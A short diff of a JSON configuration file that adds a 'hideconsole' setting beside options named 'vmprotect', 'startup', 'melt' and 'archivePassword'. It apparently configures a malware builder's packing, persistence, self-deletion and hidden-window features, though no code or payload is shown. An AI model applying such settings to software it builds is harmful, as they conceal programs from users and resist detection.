@@ -5,7 +5,8 @@
         "vmprotect" : true,
         "startup" : true,
         "melt" : false,
-        "archivePassword" : "blank"
+        "archivePassword" : "blank",
+        "hideconsole" : true
     },
     
     "modules" : {
